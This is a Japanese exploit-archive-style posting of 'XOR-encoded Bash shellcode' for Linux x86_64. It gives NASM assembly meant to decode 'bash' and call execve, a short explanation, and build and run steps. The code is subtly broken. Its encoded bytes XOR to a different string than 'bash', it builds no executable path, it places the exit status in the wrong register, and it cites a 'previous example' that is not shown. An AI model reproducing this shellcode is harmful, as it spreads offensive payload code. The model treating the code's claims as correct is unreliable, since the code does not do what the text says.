<!--
エクスプロイトのタイトル: Linux/x86_64 - XOR エンコードされた Bash シェルコード
日付: 2022年2月18日
エクスプロイトの作成者: @raheel0x01
連絡先: 0x29fe2@pm.me
カテゴリ: Shellcode
アーキテクチャ: Linux x86_64
シェルコードの長さ: 71 Bytes
-->

```assembly
; エクスプロイトのタイトル: Linux/x86_64 - XOR エンコードされた Bash シェルコード
; 日付: 2022年2月18日
; エクスプロイトの作成者: @raheel0x01
; カテゴリ: Shellcode
; アーキテクチャ: Linux x86_64
; シェルコードの長さ: 71 Bytes

section .data
 
section .text
  global _start
 
_start:
  ; execve() のための argv と envp 配列のセットアップ
  xor rax, rax
  mov [rsp-8], rax
  mov qword [rsp-16], 0x72613162 ; 暗号化された 'bash'
  xor byte [rsp-16], 0x08
  xor byte [rsp-15], 0x16
  xor byte [rsp-14], 0x24
  xor byte [rsp-13], 0x32
  lea rdx, [rsp-16]
  mov qword [rsp-24], rdx
  mov qword [rsp-32], rdx
  lea rdi, [rsp-32]
 
  ; execve() を呼び出す
  xor eax, eax
  mov al, 59
  syscall
 
  ; ステータスコード 0 で終了する
  xor eax, eax
  mov ebx, eax
  mov al, 60
  syscall
```

-----------

## 説明:

このコードは、実行されるプログラムの名前「"bash"」をXOR暗号化して隠すために使用されます。XOR暗号化キーは `0x08162432` であり、文字列の各バイトに適用されます。復号化は、`execve` を呼び出す直前に行われるため、プログラム名は元の形式で渡されます。

コードの残りの部分は前の例と同じで、`execve` 関数に対してシステムコールを行い、その後、プロセスを終了させるために `exit` システムコールを呼び出します。

---------
### コンパイルと実行:

Linuxシステムでx86_64アセンブリコードを実行するには、まず実行可能ファイルにコードをアセンブルし、そのファイルを実行する必要があります。以下に手順を示します:

1. コードを`.asm`拡張子のファイルに保存します。例えば`bash.asm`とします。

2. アセンブラ（例: NASM）を使用して、コードをオブジェクトファイルにアセンブルします:
   `nasm -f elf64 -o bash.o bash.asm`
   `-f elf64`オプションは、出力形式をELF64（実行可能リンカブル形式）に指定し、`-o`オプションは出力ファイルの名前を`bash.o`に指定します。

3. `ld`リンカを使用して、オブジェクトファイルを実行可能ファイルにリンクします:
   `ld -s -o bash bash.o`
   `-s`オプションは、出力ファイルからシンボルテーブルを削除してファイルサイズを小さくするためのものであり、`-o`オプションは出力ファイルの名前を`bash`に指定します。

4. ファイルに実行権限を付与します:
   `chmod +x bash`

5. 最後に、ファイルを実行できます:
   `./bash`
